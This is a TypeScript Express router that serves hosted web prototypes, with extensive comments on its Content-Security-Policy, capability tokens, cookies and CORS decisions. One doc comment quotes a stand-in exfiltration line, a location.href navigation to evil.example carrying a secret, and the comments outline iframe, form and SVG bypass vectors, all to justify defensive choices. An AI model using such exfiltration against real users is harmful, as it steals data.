import { Router, type Request } from "express"
import { extname } from "node:path"
import {
  canReadProject,
  loadProjectReadPolicy,
  makeProjectMembership,
  resolveReadContextLenient,
} from "../auth/authorize"
import { UnsafePathError, type AssetStore } from "../assets/types"
import type { ViewerConfig } from "../config"
import type { StorageAdapter } from "../storage/types"
import { injectBaseHref, injectBridge, rewriteRootRelativeUrls } from "./html-inject"
import { rewriteCssRootRelativeUrls } from "./css-rewrite"
import {
  CAPABILITY_SEGMENT,
  capabilityCookieName,
  isSafeCapabilityToken,
  prototypePathPrefix,
  splitCapabilityPrefix,
} from "./prototype-capability-path"
import { verifyPrototypeCapability } from "./prototype-capability"
import { readCookie } from "../auth/session-cookie"
import { isSecurePublicUrl } from "../api/state-cookie"
import { allowPrototypeCors } from "./prototype-cors"
import { PROTOTYPE_NOT_FOUND_BODY, type PrototypeOriginHostRequest } from "./prototype-host-scope"
import { resolveIsolatedOriginCsp, type SubdomainRequest } from "./subdomain"
import { isCss, isHtml } from "./mime"

export interface ServeRouterDeps {
  storage: StorageAdapter
  assets: AssetStore
  config: ViewerConfig
  /**
   * Resolves the origin the bridge posts messages to, for THIS request —
   * the viewer's own origin as the reviewer's browser actually reached it.
   *
   * A per-deployment loopback listener's shell origin is fixed for the
   * listener's whole life, decided once by the API that opened it
   * (`loopback-listener-app.ts` passes `() => deps.shellOrigin`, ignoring
   * the request). The main app's shell origin varies per request: a
   * reviewer on a loopback `publicUrl` may open the shell on either
   * `localhost` or `127.0.0.1`, and a fallback (path-mode) embed served to
   * whichever spelling the request DIDN'T arrive on would carry a
   * `data-shell-origin` and CSP `frame-ancestors` naming the wrong origin,
   * killing the bridge handshake silently (`create-app.ts` builds the real
   * resolver from `resolveOrigins`).
   */
  resolveShellOrigin: (req: Request) => string
  bridgeScript: string
  /** Bridge bundle version, e.g. "2026-08-06j-pin-guard-preview-kind" — stamps the external bridge URL (see `bridgeAssetRelPath`). */
  bridgeVersion: string
  /**
   * `ViewerConfig.prototypeCsp` passed through verbatim. `null` (unset) uses
   * the computed path-scoped default below; the literal `"off"` sends no
   * header; any other string is sent as-is.
   */
  prototypeCsp: string | null
}

/**
 * Builds the `Content-Security-Policy` header value applied to EVERY
 * response served under a prototype's `/p/{slug}/**` prefix (HTML, the
 * bridge bundle, and every other asset — see the call site below for why),
 * or `null` when no header should be sent.
 *
 * `connect-src` is deliberately scoped to the prototype's OWN path prefix
 * (`{publicUrl}/p/{slug}/`), not a bare `'self'`. A bare `'self'` would let
 * prototype JS fetch anywhere under the viewer's origin — including
 * `/api/v1/**`, credentialed with the reviewer's session cookie. Cookie
 * *path*-scoping cannot fix this instead: a cookie's `Path` attribute is
 * matched against the REQUEST url (`/api/v1/...`), not the page url the
 * script is running on (`/p/...`), so scoping the cookie to `/api` would do
 * nothing — every credentialed request already targets `/api/v1/...`.
 * `HttpOnly` doesn't help either — it only blocks the cookie from
 * `document.cookie`, not from being attached to a same-origin request the
 * browser sends automatically. Scoping `connect-src` to the prototype's own
 * prefix still lets it load its own JSON/assets via a root-relative fetch,
 * since those get rewritten under `/p/{slug}/` at serve time (see
 * `rewriteRootRelativeUrls`), while denying everything else on-origin.
 *
 * `frame-src 'none'` and `object-src 'none'` close a bypass that
 * `connect-src` scoping alone does not: with no explicit `frame-src`, it
 * falls back to `default-src 'self'`, which would let prototype JS
 * `<iframe src="/api/v1/projects">` — a genuinely same-origin frame — and
 * read `iframe.contentDocument` directly, then exfiltrate via a top-level
 * navigation (which `connect-src` does not govern at all). `object-src` is
 * closed for the equivalent reason: `<object>`/`<embed>` can achieve a
 * similar same-origin `contentDocument` read for HTML/XML-typed content.
 * `form-action 'none'` closes the sibling vector: `form-action` is a
 * navigation directive that does NOT inherit from `default-src` when
 * omitted (unlike the fetch directives above) — left unset, a same-origin
 * `<form>` could auto-submit to an attacker-controlled `action` and
 * exfiltrate that way instead.
 *
 * `script-src 'unsafe-inline'` and the permissive `style-src`/`font-src`/
 * `img-src` below were added after a live run against the real
 * `ai-gateway-prototype` (Vue 3 + Vite) under the strict
 * resource policy this comment used to describe: the bridge is injected as
 * an inline `<script>`, and a strict `default-src 'self'` with no
 * `script-src` blocks inline execution outright — `commenting`/`inspection`
 * (the product's core feature) simply did not run. Three of the
 * prototype's own inline `<script>` blocks, its Google Fonts stylesheet,
 * and an inline style set by app JS were blocked the same way. None of
 * that is optional for a prototype to be usable, so the RESOURCE
 * directives (script/style/font/img) are loosened to allow inline content
 * and `https:` origins. This does widen what a hostile prototype can fetch
 * for its own rendering (any HTTPS font/image/stylesheet) — but it does
 * NOT widen the READ-protection property: a prototype can already
 * exfiltrate arbitrary data via a top-level navigation
 * (`location.href = 'https://evil.example/?' + secret`), which nothing in
 * this policy blocks or could block, so allowing `https:` resource loads
 * does not create a new exfiltration channel, only a redundant one.
 * `'unsafe-eval'` is deliberately NOT added — the live run produced no
 * eval violations, so there's no evidence requiring it; add it later only
 * if a real prototype needs it, with the reason recorded here.
 *
 * The security property this CSP actually carries — a hosted prototype
 * cannot READ the viewer API — lives entirely in `connect-src` (path-
 * scoped, not `'self'`), `frame-src 'none'`, `object-src 'none'`, and
 * `form-action 'none'`. None of those four are touched by the resource
 * loosening above.
 *
 * The prefix stays `{publicUrl}/p/{slug}/` even when the request carried a
 * capability (`{publicUrl}/p/{slug}/~c/{token}/`). That is correct and must
 * not be "fixed": a CSP source expression whose path ends in `/` matches by
 * PATH PREFIX, so the shorter form already covers every capability URL —
 * and it keeps the policy identical for a prototype whether or not the
 * reviewer's capability is present, so a policy string can never leak the
 * token or become per-session.
 *
 * `worker-src 'none'` denies registering a service worker from this
 * response. With no explicit `worker-src`, a service-worker script load
 * falls through to `child-src`, which falls through to `script-src`, so
 * without this line workers would be PERMITTED today. That matters because
 * a service worker needs a secure context and a real (non-opaque) origin —
 * conditions the sandboxed review iframe does not meet today, but a real
 * prototype origin (a loopback twin on its own port, or `{slug}.{domain}`)
 * does. Denying it here is a deliberate design choice: a registered worker's
 * scope would otherwise be bounded only by an accident of how long the
 * capability token in its path happens to stay valid, not by anything the
 * policy actually says.
 *
 * Every `'self'`-bearing directive additionally names the prototype's own
 * prefix ABSOLUTELY (`{publicUrl}/p/{slug}/`, appended so the existing
 * tokens keep their order). This is insurance for the path-mode iframe
 * sandbox (`app/prototype-origin.ts`, security audit finding B1), where the
 * prototype document has an OPAQUE origin: CSP3 matches `'self'` by origin,
 * and an opaque origin matches nothing, which on a strict reading would
 * stop a sandboxed prototype loading its own script bundle, stylesheet or
 * images.
 *
 * Be honest about its status. MEASURED in Chromium against a replica of
 * this serve layer: `'self'` alone DOES still match in a sandboxed frame
 * (the spec sets a policy's self-origin from the response URL, not the
 * document's origin), so this widening changed nothing there — and the
 * widened form produced no violations either. It is kept because the other
 * engines are unmeasured and the two readings of the spec disagree, and
 * because it is provably free: it is the PREFIX, not the bare origin, so
 * `/api/v1/**` stays unnameable by every directive here, exactly as before.
 * Do NOT treat it as the thing holding the sandbox up.
 */
export function resolvePrototypeCsp(
  prototypeCsp: string | null,
  shellOrigin: string,
  slug: string,
): string | null {
  if (prototypeCsp === "off") return null
  if (prototypeCsp !== null) return prototypeCsp
  // `ownPrefix` is built from the shell origin THIS REQUEST arrived on, not
  // a fixed config value — see `ServeRouterDeps.resolveShellOrigin`. On the
  // reviewer's twin loopback spelling this is `http://127.0.0.1:3100/p/{slug}/`,
  // never the canonical `publicUrl` spelling; getting that wrong would name
  // the wrong origin in every 'self'-bearing directive on exactly the
  // request that most needs it right.
  const ownPrefix = `${shellOrigin}/p/${slug}/`
  return (
    `default-src 'self' data: blob: ${ownPrefix}; ` +
    `script-src 'self' 'unsafe-inline' data: blob: ${ownPrefix}; ` +
    `style-src 'self' 'unsafe-inline' https: ${ownPrefix}; ` +
    `font-src 'self' data: https: ${ownPrefix}; ` +
    `img-src 'self' data: blob: https: ${ownPrefix}; ` +
    `connect-src ${ownPrefix}; ` +
    `frame-src 'none'; ` +
    `object-src 'none'; ` +
    `worker-src 'none'; ` +
    `form-action 'none'; ` +
    `frame-ancestors 'self'`
  )
}

/**
 * `relPath` (within a prototype's own `/p/{slug}/` prefix) at which the
 * bridge bundle is served as an external script — see `injectBridge` in
 * `html-inject.ts` for why it can no longer be inlined.
 *
 * `__desde/` is a reserved namespace (double-underscore, matches the
 * `window.__DESDE_*` globals the bridge/config scripts already set):
 * no real Vite/CRA/Next static build emits a directory literally named
 * that. The filename is additionally stamped with the exact running bridge
 * version, so even a build that somehow had a `__desde/` directory
 * would only collide if it also had a file matching THIS build's version
 * string byte-for-byte — and a version bump immediately stops matching, so
 * old cached URLs never resolve to a newer, different bundle.
 */
function bridgeAssetRelPath(version: string): string {
  return `__desde/bridge-${version}.js`
}

/**
 * The read capability presented on a prototype SUBDOMAIN, sourced by channel.
 *
 * On a subdomain there is no path `~c/<token>` prefix — the prototype owns `/`
 * on its origin. The document load carries the token as a `?~c=` query, and
 * every request after that carries it as the `dsv_cap` cookie the document
 * response set. The query wins if both somehow appear. Both channels are
 * charset-gated with `isSafeCapabilityToken` before the token is used, exactly
 * as `splitCapabilityPrefix` gates the path segment. `fromQuery` is the sole
 * trigger for setting the cookie below: a token that arrived in the cookie
 * needs no re-set, and one that failed to verify sets nothing.
 */
function readSubdomainCapability(
  req: Request,
  secure: boolean,
): { token: string | null; fromQuery: boolean } {
  const queryToken = readQueryCapability(req.url)
  if (queryToken !== null) return { token: queryToken, fromQuery: true }
  // Hard cutover: on https ONLY the `__Host-dsv_cap` name is read, so a
  // sibling host cannot toss a plain `dsv_cap` cookie to grant itself a read.
  const cookieToken = readCookie(req.headers.cookie, capabilityCookieName(secure))
  if (cookieToken !== null && isSafeCapabilityToken(cookieToken)) {
    return { token: cookieToken, fromQuery: false }
  }
  return { token: null, fromQuery: false }
}

/** The charset-gated `?~c=` query value, or null when absent or malformed. */
function readQueryCapability(url: string): string | null {
  let raw: string | null
  try {
    raw = new URL(url, "http://prototype.invalid").searchParams.get(CAPABILITY_SEGMENT)
  } catch {
    return null
  }
  return raw !== null && isSafeCapabilityToken(raw) ? raw : null
}

/**
 * `Set-Cookie` for the `dsv_cap` host-only read capability.
 *
 * `Path=/; HttpOnly; SameSite=Lax`, plus `Secure` iff the deployment is https.
 * On https the NAME also gains the `__Host-` prefix (`capabilityCookieName`),
 * which the browser only honours as host-only, `Path=/`, `Secure` — closing the
 * cookie-tossing vector where a sibling `{slug}.{serveDomain}` host could set a
 * `Domain=`-scoped `dsv_cap`. NO `Domain` (host-only, scoped to the exact
 * `{slug}.{serveDomain}` host) and NO `Max-Age` (a session cookie; the token's
 * own ~30-minute expiry is what bounds it, re-checked on every
 * `verifyPrototypeCapability`). The token has already passed
 * `isSafeCapabilityToken`, so `encodeURIComponent` is a no-op on it and is kept
 * only to stay symmetric with `readCookie`'s decode.
 */
function serializeCapabilityCookie(token: string, secure: boolean): string {
  const parts = [
    `${capabilityCookieName(secure)}=${encodeURIComponent(token)}`,
    "Path=/",
    "HttpOnly",
    "SameSite=Lax",
  ]
  if (secure) parts.push("Secure")
  return parts.join("; ")
}

/**
 * Marks a request that arrived on a per-deployment loopback listener, which
 * serves ONE deployment at the root of its own origin
 * (`loopback-listener-app.ts` rewrites `/foo` to `/p/{slug}/foo` and sets
 * this).
 *
 * Declared HERE rather than beside the rewrite that sets it — which is where
 * `SubdomainRequest` lives — only to keep the import edge one-way: the
 * listener module imports `createServeRouter` from this file, so this file
 * importing a type back out of it would be a cycle. Nothing else about the
 * two markers differs.
 *
 * `deploymentId` is what the listener was OPENED for, and it is not
 * necessarily the project's active deployment: a listener is keyed on a
 * deployment id, so a new build gets a new listener while an in-progress
 * review keeps reading the bytes it started on.
 */
export interface PinnedDeploymentRequest {
  pinnedDeployment?: { deploymentId: string; slug: string }
}

/**
 * Prototype serving, for all three modes. `/p/{slug}/**` is the internal
 * form every one of them routes through:
 *
 * - **path** — the URL really is `{publicUrl}/p/{slug}/…`. Shell and
 *   prototype share an origin, so the CSP is the path-scoped one and a
 *   `<base href>` plus a root-relative rewrite make the prototype's own URLs
 *   resolve under the prefix.
 * - **subdomain** — `createSubdomainRewrite` rewrote a
 *   `{slug}.{serveDomain}` request into this form and marked it.
 * - **loopback listener** — `createLoopbackListenerApp` rewrote a request
 *   that arrived at `/` on a per-deployment loopback port into this form and
 *   marked it with the deployment it is pinned to.
 *
 * The two isolated modes share `servesAtRoot` below. Rewriting into one
 * handler rather than writing three is the whole point: the visibility gate,
 * the byte-identical 404s, the bridge route and the CSP/nosniff headers all
 * live here once.
 */
export function createServeRouter(deps: ServeRouterDeps): Router {
  // Express 5's default (non-strict) routing treats the trailing slash as
  // optional, so a plain `/p/:slug` route would match `/p/acme/` too and
  // shadow the asset route below. Strict routing makes `/p/:slug` match
  // only the exact bare path, and the wildcard route below only matches
  // when a trailing slash is present — the two are mutually exclusive.
  const router = Router({ strict: true })

  // No explicit `Request`/`Response` annotations on the handlers below:
  // typing the params that way widens `req.params` to Express 5's generic
  // `ParamsDictionary` (`string | string[]` for every key, since it must
  // cover repeated/wildcard params for ANY route). Leaving the callback
  // untyped lets TS infer the precise per-route params type from
  // `RouteParameters<Route>` instead — plain `string` for `:slug`,
  // `string[] | undefined` for the optional `{*rest}` wildcard.
  router.get("/p/:slug", (req, res) => {
    // Without the trailing slash, relative asset URLs resolve one level too high.
    res.redirect(301, `/p/${encodeURIComponent(req.params.slug)}/`)
  })

  // `{*rest}` (an optional wildcard group) is required, not `*rest`: a bare
  // `*rest` demands at least one character after the slash, so it would
  // never match `/p/acme/` (the trailing-slash, no-extra-path case).
  router.get("/p/:slug/{*rest}", async (req, res) => {
    const { slug } = req.params
    // Resolved ONCE per request and reused everywhere below (the CSP and
    // the bridge's `data-shell-origin` alike) — see
    // `ServeRouterDeps.resolveShellOrigin`. Calling it more than once per
    // request would risk two different answers disagreeing within a single
    // response if a future resolver ever became time- or state-sensitive.
    const shellOrigin = deps.resolveShellOrigin(req)
    const rawRest = req.params.rest
    // Express 5 already URL-decodes wildcard params before they reach the
    // handler, so `rawRest`'s segments are decoded once already. Decoding
    // again here would mangle a literal `%` in a filename (e.g.
    // `100%.png` becomes the segment `100%.png` post-Express-decode, and a
    // second decodeURIComponent call throws on the now-invalid `%.`
    // escape). Join the already-decoded segments directly.
    const rawSegments = Array.isArray(rawRest)
      ? rawRest
      : rawRest === undefined || rawRest === null
        ? []
        : [String(rawRest)]
    // A `~c/<token>` prefix, if present, is peeled off BEFORE the asset path
    // is assembled — see `prototype-capability-path.ts`. Syntax only at this
    // point: the token is still unverified, and an unrecognized one changes
    // nothing about how the request is authorized below.
    const { token: pathCapabilityToken, segments } = splitCapabilityPrefix(rawSegments)
    let relPath = segments.join("/")
    if (relPath === "" || relPath.endsWith("/")) relPath += "index.html"

    // A per-deployment loopback listener set this. See the spec's "Loopback
    // mode, in detail": the listener is bound to loopback only, on an
    // ephemeral port, and the API route that opened it
    // (`GET /api/v1/projects/:id/prototype-origin`) already required project
    // read from the caller. Reachability of that socket IS the credential, so
    // there is nothing here for a second gate to check: this request carries
    // no session cookie (host-only cookies do not cross the loopback host
    // flip), no capability, and no project id.
    //
    // So when pinned, the whole project lookup below is SKIPPED — no
    // `getProjectBySlug`, no capability verification, no `canReadProject`.
    // Skipping is not a widening: the slug in the path came from the
    // listener's own rewrite, not from the caller, and the deployment served
    // is the one the listener was opened for regardless of what the path
    // says.
    const pinned = (req as unknown as PinnedDeploymentRequest).pinnedDeployment ?? null

    // Whether this request arrived on a prototype subdomain host. Knowable at
    // the TOP: `createSubdomainRewrite` sets this marker before this router
    // runs, and `onSubdomain` depends on nothing computed below. It decides
    // where the read capability comes from — see the sourcing just below — and,
    // together with `pinned`, whether the prototype owns the origin root
    // (`servesAtRoot`).
    const onSubdomain = (req as unknown as SubdomainRequest).prototypeSubdomain !== undefined

    // Whether cookies this handler sets/reads carry the `__Host-` prefix. True
    // exactly when the deployment is https (the same condition as `Secure`),
    // because the browser only accepts a `__Host-` cookie over a secure
    // transport. Computed ONCE and used for both the `dsv_cap` cookie READ
    // (below) and the SET (further down), so the two names can never disagree.
    const secureCookies = isSecurePublicUrl(deps.config.publicUrl)

    // The read capability, sourced by MODE. On the shell host and on a pinned
    // loopback listener ONLY the path `~c/<token>` form is honoured, so the
    // pre-capability behaviour is byte-identical there — the query and the
    // cookie are never read at all. On a prototype subdomain the token travels
    // differently: the document load carries it as a `?~c=` query and every
    // request after that as the `dsv_cap` cookie the document response set. The
    // path form does not occur on a subdomain (the URL is `/` or `/?~c=`), so
    // there is no path-vs-query conflict.
    const { token: capabilityToken, fromQuery: capabilityFromQuery } = onSubdomain
      ? readSubdomainCapability(req, secureCookies)
      : { token: pathCapabilityToken, fromQuery: false }

    // `null` whenever pinned — the pinned branch never reads the project
    // record, and asking for it would put a storage lookup (and a
    // slug-shaped existence oracle) on a path that has no use for either.
    const project = pinned ? null : await deps.storage.getProjectBySlug(slug)
    if (!pinned && !project) {
      res.status(404).type("text/plain").send("Prototype not found")
      return
    }
    // Same not-found response as "no such slug" — a `members` project a
    // caller can't read must not be distinguishable from one that doesn't
    // exist (Phase 3b-1 Task 3; see ../auth/authorize.ts). `public-link`
    // projects and zero-member projects always pass this check unchanged.
    //
    // LENIENT on the bearer, unlike every `/api/v1/**` route: an
    // unrecognized `Authorization: Bearer …` degrades to anonymous here
    // instead of 401ing. Prototypes routinely stub an auth header against
    // their own mocked API (`fetch('/api/models', { headers: {
    // Authorization: 'Bearer demo-token' } })`, rewritten to
    // `/p/{slug}/api/models` and answered by a real JSON file in the
    // build), and 401ing that breaks the prototype with nothing on screen
    // explaining why — including on `public-link` prototypes shared by
    // anonymous link. It gives up no authorization: `canReadProject` still
    // runs with the anonymous context below, so an unreadable project
    // still 404s. See `resolveReadContextLenient` for the full rationale.
    //
    // A capability in the URL prefix is an ADDITIONAL way to authorize this
    // read, never a replacement for the check below (security audit finding
    // B1). It exists because the sandboxed review iframe has an opaque
    // origin, and an opaque origin's null site-for-cookies stops
    // `SameSite=Lax` sending `viewer_session` on SUBRESOURCE requests — so
    // a private prototype could be isolated OR could load its own JS, CSS
    // and bridge, but not both. See `prototype-capability.ts` for the shape
    // and the bounds, and `app/prototype-origin.ts` for the measurement.
    //
    // It is bound to this slug AND this deployment by construction (both are
    // MAC inputs, so a mismatch cannot verify), and it expires in minutes.
    // On ANY refusal — absent, malformed, expired, forged, minted for
    // another project — the request falls through to the identical
    // cookie/PAT path it took before capabilities existed, ending in the
    // identical byte-for-byte 404. Nothing here can widen access: the
    // capability is only ever minted for a caller the ordinary gate had
    // already admitted (`app/review/[slug]/page.tsx`).
    //
    // `project !== null` here and on the `if` below is the PINNED SKIP, and
    // it is the only place authorization is conditional: `project` is null
    // exactly when a loopback listener pinned this request, for the reasons
    // given where `pinned` is read above.
    const capabilityGranted =
      project !== null &&
      capabilityToken !== null &&
      verifyPrototypeCapability({
        token: capabilityToken,
        secret: deps.config.sessionSecret,
        slug,
        deploymentId: project.activeDeploymentId,
      })

    if (project && !capabilityGranted) {
      const ctx = await resolveReadContextLenient(deps, req)
      const readable = await canReadProject(
        ctx,
        project,
        makeProjectMembership(deps.storage),
        await loadProjectReadPolicy(deps.storage),
      )
      if (!readable) {
        res.status(404).type("text/plain").send("Prototype not found")
        return
      }
    }

    // Every URL this prototype's own markup resolves against: `/p/{slug}/`,
    // or `/p/{slug}/~c/{token}/` when the request arrived with a
    // (charset-validated) capability. Computed ONCE and used for the
    // `<base href>`, the root-relative URL rewrite and the bridge's
    // `<script src>` alike — if any of those disagreed with the document's
    // own URL, the subresource requests would drop the capability segment
    // and 404 for exactly the private prototypes this exists to serve.
    const pathPrefix = prototypePathPrefix(slug, capabilityToken)

    // Resolved ONCE per request and applied to every response this handler
    // emits below — the HTML branch, the bridge-bundle branch, and the
    // plain-asset branch alike. Scoping this to only the HTML branch was
    // the CRITICAL bug this block fixes: `.svg` maps to the scriptable,
    // same-origin `image/svg+xml` content type (see `mime.ts`), so a
    // hostile bundle's `payload.svg` — self-navigated into via
    // `location.href`, which `frame-src`/`object-src` do not govern — was
    // served with NO CSP at all, fully bypassing the isolation this policy
    // exists to provide. The policy is inert on non-document types (JS,
    // CSS, images) and load-bearing on any scriptable one (SVG today, any
    // future addition to `mime.ts` tomorrow), so sending it unconditionally
    // is strictly safer than trying to enumerate "scriptable" types here.
    // Subdomain mode gives the prototype its OWN origin, so the CSP can be
    // the stronger `connect-src 'self'` form and the shell's host-only
    // session cookie is never sent here at all. `onSubdomain` is computed at
    // the top of the handler (it also decides where the capability comes from).

    // The single `VIEWER_PROTOTYPE_ORIGIN` host, marked by
    // `createPrototypeOriginMark` (`prototype-host-scope.ts`). It is a THIRD
    // isolated mode, but a different SHAPE from the two below: cross-origin
    // (isolated CSP, real-origin sandbox, no session cookie) BUT
    // path-namespaced — all prototypes share one host, so none owns `/`, and
    // root-absolute assets still need the base href, the root-relative rewrite
    // and the prefixed bridge path. That is why it drives `isIsolatedOrigin`
    // but NOT `servesAtRoot`.
    const onPrototypeOrigin = (req as unknown as PrototypeOriginHostRequest).onPrototypeOrigin === true

    // OWNS `/` on its origin: no base href, no root-relative rewrite, the
    // bridge at the origin root. A `{slug}.{serveDomain}` host and a loopback
    // listener; NOT the shared prototype origin. Only the two places the modes
    // genuinely differ (skipping authorization, and which deployment's bytes
    // to read) branch on `pinned` itself. Anything that branches on
    // `onSubdomain` alone below this line is a bug in loopback mode.
    const servesAtRoot = onSubdomain || pinned !== null

    // CROSS-ORIGIN from the shell: the isolated-origin CSP, the real-origin
    // sandbox (chosen client-side), and NO session cookie or ACAO. Every
    // `servesAtRoot` mode is cross-origin, and so is the shared prototype
    // origin — but the shared origin is path-namespaced, so it is
    // `isIsolatedOrigin` WITHOUT being `servesAtRoot`. This is the decoupling:
    // the CSP and the CORS decision follow the origin boundary; the document
    // shaping (base href / rewrite / bridge path) follows who owns `/`.
    const isIsolatedOrigin = servesAtRoot || onPrototypeOrigin

    /**
     * `Access-Control-Allow-Origin: *`, on the same-origin path mode ONLY.
     *
     * It exists for one condition: the path-mode review iframe is sandboxed
     * without `allow-same-origin`, so the document has an OPAQUE origin and
     * its own module scripts arrive as CORS requests with `Origin: null`. In
     * an isolated mode that condition does not exist — the document's real
     * origin IS the asset origin, so every subresource fetch is same-origin
     * and CORS never runs. That holds for the shared prototype origin too: the
     * document is on the real prototype origin, so its own subresources are
     * same-origin to it.
     *
     * Sending it in an isolated mode is not merely useless, it is a hole.
     * `prototype-cors.ts`'s safety argument is that an ACAO'd response was
     * already being served byte-for-byte to that reader. A pinned request
     * skips `canReadProject` entirely, and on ANY cross-origin isolated mode
     * `*` would let a page the reviewer visits `fetch` a private prototype's
     * bytes once it names the host, widening a private prototype's reach. So
     * ACAO is withheld whenever the origin is isolated, not only when it owns
     * root.
     */
    const allowCors = (): void => {
      if (!isIsolatedOrigin) allowPrototypeCors(res)
    }

    const csp = isIsolatedOrigin
      ? resolveIsolatedOriginCsp(deps.prototypeCsp, shellOrigin)
      : resolvePrototypeCsp(deps.prototypeCsp, shellOrigin, slug)

    // The bridge bundle, served as its own resource under the prototype's
    // own path prefix — same `canReadProject` gate as everything else under
    // `/p/:slug/**` (computed once, above), same path-scoped CSP. Checked
    // before the deployment-exists gate below: the bridge script doesn't
    // depend on there being an active deployment, and intercepting here
    // (inside the one handler that already computed `readable`) means there
    // is no second route to keep in sync with this gate, and no ordering
    // question about which route matches first — it's the same match.
    if (relPath === bridgeAssetRelPath(deps.bridgeVersion)) {
      res.status(200)
      res.setHeader("Content-Type", "application/javascript; charset=utf-8")
      // `private`, not `public`: a shared cache (CDN/corporate proxy) that
      // caches a member's 200 publicly would later serve that SAME cached
      // 200 to an anonymous caller on a locked project, defeating the
      // `canReadProject` gate above as a working existence oracle. The
      // per-version filename (`bridgeAssetRelPath`) still makes the
      // response immutable — that property was never about cache
      // visibility scope.
      res.setHeader("Cache-Control", "private, max-age=31536000, immutable")
      res.setHeader("X-Content-Type-Options", "nosniff")
      allowCors()
      if (csp !== null) res.setHeader("Content-Security-Policy", csp)
      res.send(deps.bridgeScript)
      return
    }

    // The pinned deployment, NEVER `project.activeDeploymentId`. A listener
    // is opened for one deployment id and keeps serving it: when a new build
    // goes live the API opens a second listener rather than repointing this
    // one, so a review in progress cannot have the bytes change underneath
    // it. There is also no project record to read here.
    let deploymentId: string
    if (pinned) {
      deploymentId = pinned.deploymentId
    } else if (project?.activeDeploymentId) {
      deploymentId = project.activeDeploymentId
    } else {
      res.status(404).type("text/plain").send("Prototype has no deployment yet")
      return
    }

    let asset
    try {
      asset = await deps.assets.get(deploymentId, relPath)
      // SPA fallback: an extensionless miss is a client-side route.
      if (!asset && extname(relPath) === "") {
        asset = await deps.assets.get(deploymentId, "index.html")
      }
    } catch (error) {
      // Only a path-safety rejection is the client's fault. Any other
      // failure (permissions, disk I/O) is a server fault — rethrow so
      // Express's error handling produces a 5xx instead of masking it as
      // a 400, which would defeat 5xx-based alerting.
      if (error instanceof UnsafePathError) {
        res.status(400).type("text/plain").send("Bad request: invalid path")
        return
      }
      throw error
    }

    if (!asset) {
      // Shared with the prototype-host scope's two refusals, so a caller
      // cannot tell "this method is refused on a prototype origin" from
      // "this prototype has no such file". See `prototype-host-scope.ts`.
      res.status(404).type("text/plain").send(PROTOTYPE_NOT_FOUND_BODY)
      return
    }

    if (isHtml(asset.contentType)) {
      let html = asset.body.toString("utf-8")
      // In an isolated mode the prototype IS at the origin root, so its own
      // root-relative asset URLs resolve correctly with no rewriting and no
      // `<base href>`. That removes the entire class of problems Phase 1.5
      // was built to work around (a stock Vite build rendered blank under
      // path serving because `<base>` does not rebase root-relative URLs) —
      // and it removes the residue too, since an app with an explicitly
      // configured base path no longer needs to agree with ours.
      if (!servesAtRoot) {
        html = rewriteRootRelativeUrls(html, pathPrefix)
        html = injectBaseHref(html, pathPrefix)
      }
      const bridgeSrc = servesAtRoot
        ? `/${bridgeAssetRelPath(deps.bridgeVersion)}`
        : `${pathPrefix}${bridgeAssetRelPath(deps.bridgeVersion)}`
      html = injectBridge(html, shellOrigin, bridgeSrc)
      res.status(200)
      res.setHeader("Content-Type", asset.contentType)
      res.setHeader("Cache-Control", "no-store")
      res.setHeader("X-Content-Type-Options", "nosniff")
      allowCors()
      if (csp !== null) res.setHeader("Content-Security-Policy", csp)
      // Promote a verified `?~c=` document-load capability to a host-only
      // `dsv_cap` cookie, so the frame's own same-site subresource requests
      // carry it without the query being repeated in every relative URL. Set
      // ONLY here, and ONLY when: this is a subdomain host (`onSubdomain`), the
      // capability VERIFIED (`capabilityGranted`), and it arrived on the QUERY
      // (`capabilityFromQuery`). It is therefore never set on the shell host or
      // a loopback listener (neither is `onSubdomain`), never for a token that
      // arrived in the cookie (no need to re-set it), and never for one that
      // failed to verify. `capabilityToken` is non-null on this path — a
      // query-sourced token is what `capabilityFromQuery` means — but the guard
      // states it for the type checker too.
      if (onSubdomain && capabilityGranted && capabilityFromQuery && capabilityToken !== null) {
        res.append("Set-Cookie", serializeCapabilityCookie(capabilityToken, secureCookies))
      }
      res.send(html)
      return
    }

    res.status(200)
    res.setHeader("Content-Type", asset.contentType)
    res.setHeader("Cache-Control", "private, max-age=300")
    res.setHeader("X-Content-Type-Options", "nosniff")
    allowCors()
    if (csp !== null) res.setHeader("Content-Security-Policy", csp)
    // Row 5 (narrow): a standalone stylesheet's root-absolute `url(...)`
    // reference (a custom font is the common case) fetches from the shell
    // root and 404s in path/fallback mode, and unlike HTML markup there is
    // no in-browser hook to catch it — see `rewriteCssRootRelativeUrls`'s
    // doc comment (css-rewrite.ts) for the full reasoning. Gated on
    // `!servesAtRoot` for the same reason the HTML rewrite above is: an
    // isolated mode already gives the prototype the real origin root, so a
    // root-absolute url() already resolves correctly and rewriting it would
    // be wrong. Every other asset — non-CSS, or CSS in an isolated mode —
    // is sent byte-identical to what the asset store holds, same as before
    // this rewrite existed.
    if (!servesAtRoot && isCss(asset.contentType)) {
      const css = rewriteCssRootRelativeUrls(asset.body.toString("utf-8"), pathPrefix)
      res.send(css)
      return
    }
    res.send(asset.body)
  })

  return router
}
